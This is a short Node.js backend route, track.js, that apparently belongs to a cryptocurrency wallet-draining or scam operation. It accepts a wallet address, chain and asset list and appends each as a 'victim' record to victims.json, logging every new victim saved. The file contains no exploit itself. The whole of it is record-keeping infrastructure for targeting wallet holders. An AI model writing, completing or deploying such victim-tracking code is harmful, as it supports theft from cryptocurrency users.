// backend/api/track.js
import { io } from "../index.js"; 
import fs from "fs";
import path from "path";

const victimsFile = path.join(process.cwd(), "victims.json");

// Ensure victims file exists
if (!fs.existsSync(victimsFile)) {
  fs.writeFileSync(victimsFile, "[]", "utf8");
}

export default async function trackHandler(req, res) {
  try {
    const { walletAddress, chain, assets } = req.body;

    if (!walletAddress || typeof walletAddress !== "string") {
      return res.status(400).json({ error: "Valid walletAddress is required" });
    }

    const victimData = {
      walletAddress,
      chain: chain || "unknown",
      assets: Array.isArray(assets) ? assets : [],
      timestamp: new Date().toISOString()
    };

    // Save victim to file
    const victims = JSON.parse(fs.readFileSync(victimsFile, "utf8"));
    victims.push(victimData);
    fs.writeFileSync(victimsFile, JSON.stringify(victims, null, 2));

    console.log(`📡 New victim saved: ${victimData.walletAddress}`);



    res.json({ success: true });
  } catch (err) {
    console.error("❌ Track error:", err);
    res.status(500).json({ error: err.message });
  }
}
